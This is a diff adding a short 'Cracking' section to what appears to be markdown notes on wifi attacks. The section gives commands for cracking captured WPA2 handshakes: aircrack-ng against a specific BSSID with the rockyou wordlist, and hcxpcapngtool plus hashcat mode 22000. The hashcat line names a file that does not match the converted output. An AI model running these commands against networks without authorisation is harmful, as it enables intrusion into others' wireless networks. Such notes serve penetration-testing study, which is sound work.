@@ -61,6 +61,29 @@ tshark -r file-01.cap -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype 
 aircrack-ng out.cap
 ```
 
+### Cracking
+
+
+locate rockyou.txt
+
+aircrack-ng -a2 -b 10:27:F5:66:BE:27 -w rockyou.txt out.cap
+
+#### or faster way to crack ...
+
+hcxpcapngtool -o hash.hc22000 -E wordlist out.cap
+hashcat -m 22000 hc2200.txt rockyou.txt
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
